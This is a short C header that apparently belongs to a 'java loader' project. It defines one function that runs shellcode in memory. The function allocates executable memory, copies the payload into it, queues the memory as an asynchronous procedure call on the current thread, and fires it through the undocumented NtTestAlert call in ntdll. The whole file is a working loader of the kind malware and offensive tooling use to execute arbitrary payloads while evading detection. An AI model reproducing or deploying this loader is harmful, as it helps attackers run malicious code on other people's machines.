#ifndef JAVA_LOADER_APC_1_H
#define JAVA_LOADER_APC_1_H

#endif //JAVA_LOADER_APC_1_H

#include <Windows.h>

typedef VOID (NTAPI *pNtTestAlert)(VOID);

int LoadAPC1(unsigned char *shellcode, int length) {
    pNtTestAlert NtTestAlert = (pNtTestAlert) GetProcAddress(
            GetModuleHandleA("ntdll.dll"), "NtTestAlert");
    LPVOID lpBaseAddress = VirtualAlloc(NULL, length,
                                        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(lpBaseAddress, shellcode, length);
    QueueUserAPC((PAPCFUNC) lpBaseAddress, GetCurrentThread(), (ULONG_PTR) NULL);
    NtTestAlert();
    return TRUE;
}